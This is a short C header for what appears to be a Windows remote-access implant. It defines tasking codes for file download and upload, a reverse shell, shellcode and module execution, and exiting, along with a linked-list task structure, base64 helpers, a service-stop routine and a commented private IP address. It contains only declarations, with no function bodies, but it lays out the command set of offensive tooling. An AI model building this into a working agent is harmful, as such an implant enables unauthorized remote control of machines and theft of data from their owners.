#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <libssh/libssh.h>
#include <Windows.h>
#include <Lmcons.h>
#include <direct.h>
#include <math.h>

//192.168.197.137

#define AGENT_DOWN_FILE 10
#define AGENT_REV_SHELL 12
#define AGENT_UP_FILE 11
#define AGENT_EXEC_SC 13
#define AGENT_EXEC_MODULE 14
#define AGENT_EXIT 0	//find way to kill service.

struct tasking_struct {
	int operation;
	char* opts;
	struct tasking_struct* nextStruct;
};

size_t b64_encoded_size(size_t inlen);
size_t b64_decoded_size(const char* in);
char* b64_encode(const unsigned char* in, size_t len);
int b64_isvalidchar(char c);
int b64_decode(const char* in, unsigned char* out, size_t outlen);

VOID __stdcall DoStopSvc();